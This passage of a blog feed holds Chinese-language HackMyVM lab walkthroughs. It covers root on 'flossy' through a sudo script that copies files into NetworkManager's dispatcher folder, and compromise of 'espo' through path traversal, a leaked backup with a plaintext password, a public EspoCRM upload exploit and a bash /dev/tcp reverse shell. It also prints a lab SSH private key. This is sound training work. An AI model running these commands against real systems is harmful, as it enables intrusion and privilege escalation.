vuF5Y/GnAPaCRt8hUoMLATSGqgCatc8UqQ58wQaUiKmZNjppB8PATQbYffA90SgeXdUjqt
KTYgZOHbUP0BoHe0t9KBzZaheduDX+IwicZDC1JOduxmvnIz5jNOvA7TmTBcX2P4Fq545O
OLYoLeED+IZJjBLbIT6bOEhenZueOBWIIWLPq4Ah/bcfg31Je2RS5wb4hi/Ucze8kC1Ffw
TxaHfEj4oXf7O20jBnwb6KQlhXLni9MQHdtkOwlNY0oOFuvmkn2wkkTQ94pLc/0rFjdv0U
dh/jEMQddSearyxcatvdQdGZ6IubIAEWVIoQ4oY4T8lS9HXKNsK0LS+nstgXnUbV9uBno6
Brr3and/6h4uUd+bGeM3FAhJXTcKtGgv29xFP3Jrtep5g7oSWaU9iC49+XK54PBWn9/WQH
iERSrMn4m50TMaAcC5FlshLPIdgDywAAAAMBAAEAAAGAOMcNhJfYbhFdnt7RKPQWyoubND
kqJxFEqPNBIf3WkTpZ9o42Irn/vuogES+eI2Y2WWsdIIITl8PhsRiNhUgz9x8snRj30ccp
cm5jqqmwi8OTaI+fnIwivn5YRZEqsw24iv2774tWGTwX/JjVvB1sHrvv5eifRvz2JR+rRV
XujBDzPdzQrkfxrOxkvAYr7VqR25EwH8GKl3Rf/f19zc+ymaqcqwEld+7PY3vMIwJIi0Km
HaOz9Usppl7864JZAjZvZu+C1hzouj+hXRFLlUZJGIw+N50C+vmaI0Py4ZDwubwisr+QdP
sihk7GJChCzfs00X5BJ54mUf8o8ka7kjCmoh8niXsOtRGTrThX4U6dy29Fj7q/NHXC9JG8
n4j92V3sQJir4b7EKY9C4dwGM2J/lT41DNluj1iAFj+FZgq/a1BOiIGAgLOloJW9NtPN2M
rdqBVbMaP7C2MRpybCSzVb7MOBk4ySynjk9xHoTgLLzQHHhlOBzua5zfiVrfDLt4v5AAAA
wEAL+tJoildf450QGsY3elLbx9TaUw4uW9bH7YfZ+68eV+TbW5bAzQLV6s1g3Lru1oppVS
Uo2G4uPNyAVHVqU5YNKp0W4f2LfRrwYabEnzGyt5BGWBXHrRl16X2KKk3cuJ/Lld0wY5aJ
iDZE8AL8Hkt6IeReFhCR3CMDOjoLasTnS0k+CLRG5/E22bqy5Y/r07eElt1ptdZXUnbILi
9/TQn0BgMJNbACry7TLYWf11SAW+HlDqvHIait9JJZVvdsCwAAAMEAxWqZ9pKSh1S0riAy
KoQVkuZ5OW27JYZKmJO1MrkwIWO+UXpXyrWCdh2grXLDmli1R688VE07xWg25ygtNR9w2d
UhNYutFu7Mj8IDEVQ3MkQDozdFTNZUmx5cNUKADIbCt88Uwvsw6asQKWuQeyXivLPVkTLI
Vp3MD5e8t2jlt8Bprc52xQ3DG1HqgavwP6KSSDkirflegl/I74MSEAyYJ24JqWDJwwOYqu
YGdU5z4TsMm87m9dITdAYtl3fTvXpzAAAAwQDCce6pgoKJiodd1qNdFQzMMBZeP0SqnWUH
vfNJdcKSgg8wJVEC1nupH8JZNUAuXQSUS0y1vqpVMgtvB/ui4HBiyWFsHLg181vhGy880U
HM28Q6oJt8Pi9yJ7iwMMKws5eoYQlV0pvQsh+I+4dhK/v09DHLQ2iPSbaqAxUcRmkhN0VJ
aK3CMiTLcp06jECr7qKu3wJVsHZf5C36M5H1204Iuah851GpSCbmIZSgSd0BNvQQ2/k5tW
jbk/VAmeosQ0kAAAANc29waGllQGZsb3NzeQECAwQFBg\=\=
-----END OPENSSH PRIVATE KEY-----
```

将密钥写入`id_rsa`中，连接ssh（**建议重新开个kali窗口进行连接，不然它一直弹私钥挺烦的**）

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ ssh sophie@127.0.0.1 -i id_rsa 
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:TCA/ssXFaEc0sOJl0lvYyqTVTrCpkF0wQfyj5mJsALc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
Linux flossy 6.1.0-10-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.37-1 (2023-07-03) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
[oh-my-zsh] Would you like to update? [Y/n] n
[oh-my-zsh] You can update manually by running `omz update`
╭─sophie@flossy ~ 
╰─$ id
uid=1001(sophie) gid=1001(sophie) groups=1001(sophie),100(users)
```

继续进行提权

```bash
╭─sophie@flossy ~ 
╰─$ sudo -l
sudo: unable to resolve host flossy: Name or service not known
Matching Defaults entries for sophie on flossy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User sophie may run the following commands on flossy:
    (ALL : ALL) NOPASSWD: /home/sophie/network*
╭─sophie@flossy ~ 
╰─$ cat network           
#!/bin/bash


connected_ip(){
        connection_type=TCP
        champ=2
        ignores=LISTEN
        lsof_args=-ni

        port_local='[0-9][0-9][0-9][0-9][0-9]-&gt;'

        lsof '$lsof_args' | grep $connection_type | grep -v '$ignores' |
        awk '{print $9}' | cut -d : -f $champ | sort | uniq |
        sed s/'^$port_local'//
 }

dispatcher() {
    for s in /opt/*; do
        if [ -f '$s' ]; then
            d='/etc/NetworkManager/dispatcher.d/$(basename $s)'
            if [ ! -f '$d' ] || [ '$s' -nt '$d' ]; then
                return 0
            fi
        fi
    done
    return 1
}

update() {
    if [[ -z $(find /opt -type f) ]] ; then
      exit 0
    else
      echo 'Updating scripts.'
      cp /opt/* /etc/NetworkManager/dispatcher.d/
      chmod +x /etc/NetworkManager/dispatcher.d/*
      echo 'Scripts updated.'
    fi
}



case '${1}' in
ip)   connected_ip ;;
disp) dispatcher ; update ;;
*)    echo 'Usage: ./$0 option' ;;
esac
```

这个脚本只用关注它会把`/opt/`中的所有文件复制到`/etc/NetworkManager/dispatcher.d/`并给予执行权限。尝试**恶意代码注入**

```bash
╭─sophie@flossy /opt
╰─\$ echo 'chmod u+s /bin/bash' &gt; a.sh
╭─sophie@flossy /opt 
╰─$ chmod +x a.sh
╭─sophie@flossy /opt 
╰─$ sudo /home/sophie/network disp 
sudo: unable to resolve host flossy: Name or service not known
Updating scripts.
Scripts updated.
╭─sophie@flossy /opt 
╰─$ ls -la /etc/NetworkManager/dispatcher.d/
total 3468
drwxr-xr-x 5 root root    4096 Jan 17 10:44 .
drwxr-xr-x 7 root root    4096 Oct  6  2023 ..
-rwxr-xr-x 1 root root    2293 Mar  9  2023 01-ifupdown
-rwxr-xr-x 1 root root      20 Jan 17 10:44 a.sh
drwxr-xr-x 2 root root    4096 Mar  9  2023 no-wait.d
drwxr-xr-x 2 root root    4096 Mar  9  2023 pre-down.d
drwxr-xr-x 2 root root    4096 Mar  9  2023 pre-up.d
-rwxr-xr-x 1 root root 3518724 Jan 17 10:44 pspy
╭─sophie@flossy /opt 
╰─$ cd /etc/NetworkManager/dispatcher.d/          
╭─sophie@flossy /etc/NetworkManager/dispatcher.d 
╰─$ nmcli connection up lo
Connection successfully activated (D-Bus active path: /org/freedesktop/NetworkManager/ActiveConnection/2)
╭─sophie@flossy /etc/NetworkManager/dispatcher.d 
╰─$ ls -la /bin/bash                  
-rwsr-xr-x 1 root root 1265648 Apr 23  2023 /bin/bash
╭─sophie@flossy /etc/NetworkManager/dispatcher.d 
╰─$ bash -p                                 
bash-5.2# id
uid=1001(sophie) gid=1001(sophie) euid=0(root) groups=1001(sophie),100(users)
```

![Image](https://github.com/user-attachments/assets/6adbe1c8-e9d6-4394-a24d-345116fda9f7)sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_flossy.html</guid><pubDate>Fri, 27 Jun 2025 09:33:08 +0000</pubDate></item><item><title>hmv_espo</title><link>https://7r1UMPHK.github.io/post/hmv_espo.html</link><description># hmv_espo

# 0.简介

**靶机**：[hackmyvm - espo](https://hackmyvm.eu/machines/machine.php?vm=espo)
**难度**：黄色
**目标 IP**：192.168.205.236
**本机 IP**：192.168.205.141

---

# 1.扫描

`nmap`起手

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS -p- -Pn -n -T4 192.168.205.236
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-08 13:19 CST
Nmap scan report for 192.168.205.236
Host is up (0.00024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:9F:01:54 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds                                                            
```

---

# 2.踩点

![image](https://github.com/user-attachments/assets/ba54a62f-4f78-4f4d-89e2-686f549e1ed3)

是个登录栏，搜索一下有没有什么漏洞

```bash
┌──(kali㉿kali)-[~/test]
└─$ whatweb http://192.168.205.236                                     
http://192.168.205.236 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], IP[192.168.205.236], PHP[8.2.7], PoweredBy[EspoCRM], Script[text/javascript], Title[EspoCRM], UncommonHeaders[x-content-type-options,content-security-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/8.2.7], nginx
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ searchsploit EspoCRM
---------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                      |  Path
---------------------------------------------------------------------------------------------------- ---------------------------------
EspoCRM 5.8.5 - Privilege Escalation                                                                | multiple/webapps/48376.txt
---------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                 
```

只有权限提升漏洞，但是我们没有用户。爆破一下目录

```bash
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://192.168.205.236 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md -b 404 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.236
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,md,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 162] [--&gt; http://192.168.205.236/admin/]
/install              (Status: 301) [Size: 162] [--&gt; http://192.168.205.236/install/]
/api                  (Status: 301) [Size: 162] [--&gt; http://192.168.205.236/api/]
/index.php            (Status: 200) [Size: 2480]
/portal               (Status: 301) [Size: 162] [--&gt; http://192.168.205.236/portal/]
/client               (Status: 301) [Size: 162] [--&gt; http://192.168.205.236/client/]
/robots.txt           (Status: 200) [Size: 26]
Progress: 42982 / 311425 (13.80%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 44082 / 311425 (14.15%)
===============================================================
Finished
===============================================================
                                 
```

发现一点有意思的东西

![image](https://github.com/user-attachments/assets/306ae256-9fb8-4015-8043-7f4c36e3cf51)

![image](https://github.com/user-attachments/assets/cc7f8b66-6f91-4398-b024-d748c9055a51)

貌似可以通过绕过读取文件夹外的文件，我们爆破试试

```bash
┌──(kali㉿kali)-[~/test]
└─$ wfuzz -u 'http://192.168.205.236/admin../FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404  
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.236/admin../FUZZ
Total requests: 62284

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000000003:   301        7 L      11 W       162 Ch      'admin'                                                             
000004255:   403        7 L      9 W        146 Ch      'http://192.168.205.236/admin../'                                   
000008002:   301        7 L      11 W       162 Ch      '_oldsite'                                                          
000030014:   403        7 L      9 W        146 Ch      'http://192.168.205.236/admin../'                                   
000059104:   403        7 L      9 W        146 Ch      'http://192.168.205.236/admin../'                                   

Total time: 0
Processed Requests: 62284
Filtered Requests: 62279
Requests/sec.: 0

              
```

确实可以，我们继续爆破

```bash
┌──(kali㉿kali)-[~/test]
└─$ wfuzz -u 'http://192.168.205.236/admin../_oldsite/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404  
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.236/admin../_oldsite/FUZZ
Total requests: 62284

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000000167:   200        11 L     79 W       540 Ch      'info'                                                              
000004255:   403        7 L      9 W        146 Ch      'http://192.168.205.236/admin../_oldsite/'                          
000030014:   403        7 L      9 W        146 Ch      'http://192.168.205.236/admin../_oldsite/'                          
000059104:   403        7 L      9 W        146 Ch      'http://192.168.205.236/admin../_oldsite/'                          

Total time: 34.86630
Processed Requests: 62284
Filtered Requests: 62280
Requests/sec.: 1786.366

                                           
```

有个文件，我们查看一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.236/admin../_oldsite/info
# Backup Configuration Settings
# This configuration file dictates the backup protocols for critical data storage.

# Directory for storing backup files
# All backup files are stored in compressed ZIP format for efficient space usage and security.
# Ensure that backups are regularly updated and verified for data integrity.

backup_directory: /admin/_oldsite
backup_format: zip
# Note: The backup directory is designated for ZIP file backups only. 
# Regular maintenance and checks are required to ensure data consistency and reliability.
                                                                                            
翻译
#备份配置设置
#该配置文件规定了关键数据存储的备份协议。
#备份文件存放目录
#所有备份文件都以压缩ZIP格式存储，以提高空间使用效率和安全性。
确保定期更新备份并验证数据完整性。
backup_directory:/admin/_oldsite
backup_format:zip
注意：指定的备份目录仅用于ZIP文件备份。
#需要定期维护和检查，确保数据的一致性和可靠性。
```

告诉了我们会保存备注文件，并且备份文件会以.zip为后缀，我们根据信息爆破一下

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ wfuzz -u 'http://192.168.205.236/admin../_oldsite/FUZZ.zip' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.236/admin../_oldsite/FUZZ.zip
Total requests: 62284

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000000066:   200        139379   1377104    36126245    'backup'                                                            
                         L       W          Ch                                                                              

Total time: 36.69276
Processed Requests: 62284
Filtered Requests: 62283
Requests/sec.: 1697.446

                             
```

我们把备份文件下载下来

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ wget http://192.168.205.236/admin../_oldsite/backup.zip
--2025-01-08 13:40:14--  http://192.168.205.236/admin../_oldsite/backup.zip
正在连接 192.168.205.236:80... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：37975754 (36M) [application/zip]
正在保存至: “backup.zip”

backup.zip                        100%[============================================================&gt;]  36.22M  --.-KB/s  用时 0.08s   

2025-01-08 13:40:14 (464 MB/s) - 已保存 “backup.zip” [37975754/37975754])

                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp]
└─$ unzip backup.zip 

┌──(kali㉿kali)-[~/test/tmp]
└─$ ls
application  bootstrap.php    command.php  daemon.php     extension.php  install      public       vendor
backup.zip   clear_cache.php  cron.php     data           html           LICENSE.txt  rebuild.php  web.config
bin          client           custom       EspoCRM-7.2.4  index.php      preload.php  upgrade.php  websocket.php
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp]
└─$ cd data 
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/data]
└─$ ls -la
总计 44
drwxrwxr-x  7 kali kali 4096 2023年12月 4日 .
drwxrwxr-x 12 kali kali 4096  1月 8日 13:40 ..
drwxrwxr-x  3 kali kali 4096 2023年12月 4日 .backup
drwxrwxr-x  3 kali kali 4096 2023年12月 4日 cache
-rw-rw-r--  1 kali kali  972 2023年12月 4日 config-internal.php
-rw-rw-r--  1 kali kali 5711 2023年12月 4日 config.php
-rw-rw-r--  1 kali kali    1 2023年12月 4日 .data
drwxr-xr-x  2 kali kali 4096 2023年12月 4日 logs
drwxrwxr-x  2 kali kali 4096 2023年12月 4日 tmp
drwxrwxr-x  4 kali kali 4096 2023年12月 4日 upload
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/data]
└─$ cat config.php                                            
&lt;?php
return [
  'useCache' =&gt; true,
  'jobMaxPortion' =&gt; 15,
  'jobRunInParallel' =&gt; false,
  'jobPoolConcurrencyNumber' =&gt; 8,
  'daemonMaxProcessNumber' =&gt; 5,
  'daemonInterval' =&gt; 10,
  'daemonProcessTimeout' =&gt; 36000,
  'recordsPerPage' =&gt; 20,
  'recordsPerPageSmall' =&gt; 5,
  'recordsPerPageSelect' =&gt; 10,
  'applicationName' =&gt; 'EspoCRM',
  'version' =&gt; '7.2.4',
  'timeZone' =&gt; 'UTC',
  'dateFormat' =&gt; 'DD.MM.YYYY',
  'timeFormat' =&gt; 'HH:mm',
  'weekStart' =&gt; 0,
  'thousandSeparator' =&gt; ',',
  'decimalMark' =&gt; '.',
  'exportDelimiter' =&gt; ',',
  'currencyList' =&gt; [
    0 =&gt; 'EUR'
  ],
  'defaultCurrency' =&gt; 'EUR',
  'baseCurrency' =&gt; 'EUR',
  'currencyRates' =&gt; [],
  'outboundEmailIsShared' =&gt; true,
  'outboundEmailFromName' =&gt; 'EspoCRM',
  'outboundEmailFromAddress' =&gt; '',
  'smtpServer' =&gt; '',
  'smtpPort' =&gt; 25,
  'smtpAuth' =&gt; true,
  'smtpSecurity' =&gt; '',
  'smtpUsername' =&gt; 'admin',
  'smtpPassword' =&gt; '39Ue4kcVJ#YpaAV24CNmbWU',
  'language' =&gt; 'en_US',
  'authenticationMethod' =&gt; 'Espo',
  'globalSearchEntityList' =&gt; [
    0 =&gt; 'Account',
    1 =&gt; 'Contact',
    2 =&gt; 'Lead',
    3 =&gt; 'Opportunity'
  ],
  'tabList' =&gt; [
    0 =&gt; 'Account',
    1 =&gt; 'Contact',
    2 =&gt; 'Lead',
    3 =&gt; 'Opportunity',
    4 =&gt; 'Case',
    5 =&gt; 'Email',
    6 =&gt; 'Calendar',
    7 =&gt; 'Meeting',
    8 =&gt; 'Call',
    9 =&gt; 'Task',
    10 =&gt; '_delimiter_',
    11 =&gt; 'Document',
    12 =&gt; 'Campaign',
    13 =&gt; 'KnowledgeBaseArticle',
    14 =&gt; 'Stream',
    15 =&gt; 'User'
  ],
  'quickCreateList' =&gt; [
    0 =&gt; 'Account',
    1 =&gt; 'Contact',
    2 =&gt; 'Lead',
    3 =&gt; 'Opportunity',
    4 =&gt; 'Meeting',
    5 =&gt; 'Call',
    6 =&gt; 'Task',
    7 =&gt; 'Case',
    8 =&gt; 'Email'
  ],
  'exportDisabled' =&gt; false,
  'adminNotifications' =&gt; true,
  'adminNotificationsNewVersion' =&gt; true,
  'adminNotificationsCronIsNotConfigured' =&gt; true,
  'adminNotificationsNewExtensionVersion' =&gt; true,
  'assignmentEmailNotifications' =&gt; false,
  'assignmentEmailNotificationsEntityList' =&gt; [
    0 =&gt; 'Lead',
    1 =&gt; 'Opportunity',
    2 =&gt; 'Task',
    3 =&gt; 'Case'
  ],
  'assignmentNotificationsEntityList' =&gt; [
    0 =&gt; 'Meeting',
    1 =&gt; 'Call',
    2 =&gt; 'Task',
    3 =&gt; 'Email'
  ],
  'portalStreamEmailNotifications' =&gt; true,
  'streamEmailNotificationsEntityList' =&gt; [
    0 =&gt; 'Case'
  ],
  'streamEmailNotificationsTypeList' =&gt; [
    0 =&gt; 'Post',
    1 =&gt; 'Status',
    2 =&gt; 'EmailReceived'
  ],
  'emailNotificationsDelay' =&gt; 30,
  'emailMessageMaxSize' =&gt; 10,
  'notificationsCheckInterval' =&gt; 10,
  'maxEmailAccountCount' =&gt; 2,
  'followCreatedEntities' =&gt; false,
  'b2cMode' =&gt; false,
  'theme' =&gt; 'Espo',
  'themeParams' =&gt; (object) [
    'navbar' =&gt; 'side'
  ],
  'massEmailMaxPerHourCount' =&gt; 100,
  'massEmailVerp' =&gt; false,
  'personalEmailMaxPortionSize' =&gt; 50,
  'inboundEmailMaxPortionSize' =&gt; 50,
  'emailAddressLookupEntityTypeList' =&gt; [
    0 =&gt; 'User',
    1 =&gt; 'Contact',
    2 =&gt; 'Lead',
    3 =&gt; 'Account'
  ],
  'authTokenLifetime' =&gt; 0,
  'authTokenMaxIdleTime' =&gt; 48,
  'userNameRegularExpression' =&gt; '[^a-z0-9\\-@_\\.\\s]',
  'addressFormat' =&gt; 1,
  'displayListViewRecordCount' =&gt; true,
  'dashboardLayout' =&gt; [
    0 =&gt; (object) [
      'name' =&gt; 'My Espo',
      'layout' =&gt; [
        0 =&gt; (object) [
          'id' =&gt; 'default-activities',
          'name' =&gt; 'Activities',
          'x' =&gt; 2,
          'y' =&gt; 2,
          'width' =&gt; 2,
          'height' =&gt; 4
        ],
        1 =&gt; (object) [
          'id' =&gt; 'default-stream',
          'name' =&gt; 'Stream',
          'x' =&gt; 0,
          'y' =&gt; 0,
          'width' =&gt; 2,
          'height' =&gt; 4
        ]
      ]
    ]
  ],
  'calendarEntityList' =&gt; [
    0 =&gt; 'Meeting',
    1 =&gt; 'Call',
    2 =&gt; 'Task'
  ],
  'activitiesEntityList' =&gt; [
    0 =&gt; 'Meeting',
    1 =&gt; 'Call'
  ],
  'historyEntityList' =&gt; [
    0 =&gt; 'Meeting',
    1 =&gt; 'Call',
    2 =&gt; 'Email'
  ],
  'busyRangesEntityList' =&gt; [
    0 =&gt; 'Meeting',
    1 =&gt; 'Call'
  ],
  'emailAutoReplySuppressPeriod' =&gt; '2 hours',
  'emailAutoReplyLimit' =&gt; 5,
  'cleanupJobPeriod' =&gt; '1 month',
  'cleanupActionHistoryPeriod' =&gt; '15 days',
  'cleanupAuthTokenPeriod' =&gt; '1 month',
  'currencyFormat' =&gt; 2,
  'currencyDecimalPlaces' =&gt; 2,
  'aclAllowDeleteCreated' =&gt; false,
  'aclAllowDeleteCreatedThresholdPeriod' =&gt; '24 hours',
  'attachmentUploadMaxSize' =&gt; 256,
  'attachmentUploadChunkSize' =&gt; 4,
  'inlineAttachmentUploadMaxSize' =&gt; 20,
  'textFilterUseContainsForVarchar' =&gt; false,
  'tabColorsDisabled' =&gt; false,
  'massPrintPdfMaxCount' =&gt; 50,
  'emailKeepParentTeamsEntityList' =&gt; [
    0 =&gt; 'Case'
  ],
  'streamEmailWithContentEntityTypeList' =&gt; [
    0 =&gt; 'Case'
  ],
  'recordListMaxSizeLimit' =&gt; 200,
  'noteDeleteThresholdPeriod' =&gt; '1 month',
  'noteEditThresholdPeriod' =&gt; '7 days',
  'emailForceUseExternalClient' =&gt; false,
  'useWebSocket' =&gt; false,
  'auth2FAMethodList' =&gt; [
    0 =&gt; 'Totp'
  ],
  'personNameFormat' =&gt; 'firstLast',
  'newNotificationCountInTitle' =&gt; false,
  'pdfEngine' =&gt; 'Tcpdf',
  'smsProvider' =&gt; NULL,
  'defaultFileStorage' =&gt; 'EspoUploadDir',
  'ldapUserNameAttribute' =&gt; 'sAMAccountName',
  'ldapUserFirstNameAttribute' =&gt; 'givenName',
  'ldapUserLastNameAttribute' =&gt; 'sn',
  'ldapUserTitleAttribute' =&gt; 'title',
  'ldapUserEmailAddressAttribute' =&gt; 'mail',
  'ldapUserPhoneNumberAttribute' =&gt; 'telephoneNumber',
  'ldapUserObjectClass' =&gt; 'person',
  'ldapPortalUserLdapAuth' =&gt; false,
  'passwordGenerateLength' =&gt; 10,
  'massActionIdleCountThreshold' =&gt; 100,
  'exportIdleCountThreshold' =&gt; 1000,
  'cacheTimestamp' =&gt; 1701712486,
  'microtime' =&gt; 1701712486.097623,
  'siteUrl' =&gt; 'http://espo.hmv',
  'fullTextSearchMinLength' =&gt; 4,
  'appTimestamp' =&gt; 1701712486,
  'maintenanceMode' =&gt; NULL,
  'cronDisabled' =&gt; NULL
];
                                                    
```

在data文件夹中发现了配置文件，并且配置文件中有账号和密码，我们尝试登录

成功进入`EspoCRM`,查看一下他版本信息

![image](https://github.com/user-attachments/assets/8f423202-8c7b-46e8-b510-c04bb6db8c22)

搜索该版本有没有漏洞。通过搜索发现存在[上传文件漏洞](https://github.com/josemlwdf/CVE-2023-5965)，我们利用一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ git clone https://github.com/josemlwdf/CVE-2023-5965.git  
正克隆到 'CVE-2023-5965'...
remote: Enumerating objects: 37, done.
remote: Counting objects: 100% (37/37), done.
remote: Compressing objects: 100% (34/34), done.
remote: Total 37 (delta 14), reused 0 (delta 0), pack-reused 0 (from 0)
接收对象中: 100% (37/37), 12.33 KiB | 287.00 KiB/s, 完成.
处理 delta 中: 100% (14/14), 完成.
                                             
```

发现第一个通过更新无效，尝试第二个上传插件，成功上传并有反馈

![image](https://github.com/user-attachments/assets/071ec117-95b6-4961-9461-a3d6149fb201)

![image](https://github.com/user-attachments/assets/38120df0-907d-49a6-a5b0-fbf11a575ed1)

弹一个反弹shell回来

```bash
# 执行语句
bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1'

┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888                        
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.236] 35578
bash: cannot set terminal process group (509): Inappropriate ioctl for device
bash: no job control in this shell
www-data@espo:~/html/public$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

# 3. 获得稳定的 Shell

获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

---

# 4.提权

```bash
www-data@espo:~/html/public$ ls -la
total 36
drwxr-xr-x  5 www-data www-data 4096 Jan  8 06:52 .
drwxr-xr-x 12 www-data www-data 4096 Dec  4  2023 ..
drwxr-xr-x  3 www-data www-data 4096 Dec  4  2023 api
-rw-r--r--  1 www-data www-data 1689 Dec  4  2023 index.php
drwxr-xr-x  5 www-data www-data 4096 Dec  4  2023 install
-rw-r--r--  1 www-data www-data 1660 Dec  4  2023 oauth-callback.php
drwxr-xr-x  2 www-data www-data 4096 Dec  4  2023 portal
-rw-r--r--  1 www-data www-data   26 Dec  4  2023 robots.txt
-rw-r--r--  1 www-data www-data  302 Jan  8 06:52 webshell.php
www-data@espo:~/html/public$ cd ..
www-data@espo:~/html$ ls -la
total 136
drwxr-xr-x 12 www-data www-data  4096 Dec  4  2023 .
drwxr-xr-x  4 root     root      4096 Dec  4  2023 ..
-rw-r--r--  1 www-data www-data  1153 Dec  4  2023 .htaccess
drwxr-xr-x  2 www-data www-data  4096 Dec  4  2023 EspoCRM-7.2.4
-rw-r--r--  1 www-data www-data 35819 Dec  4  2023 LICENSE.txt
drwxr-xr-x  3 www-data www-data  4096 Dec  4  2023 application
drwxr-xr-x  2 www-data www-data  4096 Dec  4  2023 bin
-rw-r--r--  1 www-data www-data  1498 Dec  4  2023 bootstrap.php
-rw-r--r--  1 www-data www-data  1543 Dec  4  2023 clear_cache.php
drwxr-xr-x 12 www-data www-data  4096 Dec  4  2023 client
-rw-r--r--  1 www-data www-data  1536 Dec  4  2023 command.php
-rw-r--r--  1 www-data www-data  1531 Dec  4  2023 cron.php
drwxrwxr-x  3 www-data www-data  4096 Dec  4  2023 custom
-rw-r--r--  1 www-data www-data  1535 Dec  4  2023 daemon.php
drwxrwxr-x  7 www-data www-data  4096 Jan  8 06:52 data
-rw-r--r--  1 www-data www-data  2812 Dec  4  2023 extension.php
drwxr-xr-x  2 www-data www-data  4096 Dec  4  2023 html
-rw-r--r--  1 www-data www-data  3170 Dec  4  2023 index.php
drwxr-xr-x  4 www-data www-data  4096 Dec  4  2023 install
-rw-r--r--  1 www-data www-data  1537 Dec  4  2023 preload.php
drwxr-xr-x  5 www-data www-data  4096 Jan  8 06:52 public
-rw-r--r--  1 www-data www-data  1537 Dec  4  2023 rebuild.php
-rw-r--r--  1 www-data www-data  3034 Dec  4  2023 upgrade.php
drwxr-xr-x 39 www-data www-data  4096 Dec  4  2023 vendor
-rw-r--r--  1 www-data www-data  2534 Dec  4  2023 web.config
-rw-r--r--  1 www-data www-data  1541 Dec  4  2023 websocket.php
www-data@espo:~/html$ cd /home/
www-data@espo:/home$ ls -al
total 12
drwxr-xr-x  3 root   root   4096 Jan 24  2024 .
drwxr-xr-x 18 root   root   4096 Dec  4  2023 ..
drwxr-xr-x  6 mandie mandie 4096 Jan  8 06:55 mandie
www-data@espo:/home$ cd mandie/
www-data@espo:/home/mandie$ ls -al
total 48
drwxr-xr-x  6 mandie mandie 4096 Jan  8 06:55 .
drwxr-xr-x  3 root   root   4096 Jan 24  2024 ..
lrwxrwxrwx  1 root   root      9 Jan 26  2024 .bash_history -&gt; /dev/null
-rw-r--r--  1 mandie mandie  220 Dec  4  2023 .bash_logout
-rw-r--r--  1 mandie mandie 3526 Dec  4  2023 .bashrc
